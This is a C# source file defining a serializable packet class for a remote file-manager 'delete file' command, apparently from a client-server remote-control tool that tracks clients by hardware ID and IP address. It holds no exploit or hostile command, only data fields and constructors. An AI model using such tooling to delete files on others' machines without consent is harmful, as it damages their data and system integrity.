using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class DeleteFilePacket : IPacket
    {
        //server
        public DeleteFilePacket(string path, string name, long fileTicket) : base()
        {
            packetType = PacketType.FM_DELETE_FILE;

            this.path = path;
            this.name = name;
            this.fileTicket = fileTicket;
        }

        //client
        public DeleteFilePacket(string path, string name, bool deleted, string baseIp, string HWID, long fileTicket) : base()
        {
            packetType = PacketType.FM_DELETE_FILE;
            this.baseIp = baseIp;
            this.HWID = HWID;
            this.fileTicket = fileTicket;

            this.path = path;
            this.name = name;
            this.deleted = deleted;
        }

        public string HWID { get; set; }
        public string baseIp { get; set; }
        public byte[] plugin { get; set; }
        public PacketType packetType { get; }
        public PacketState packetState { get; set; }
        public string status { get; set; }
        public string datePacketStatus { get; set; }
        public int packetSize { get; set; }
        public long fileTicket { get; set; }

        public string path { get; set; }
        public string name { get; set; }
        public bool deleted { get; set; }
    }
}
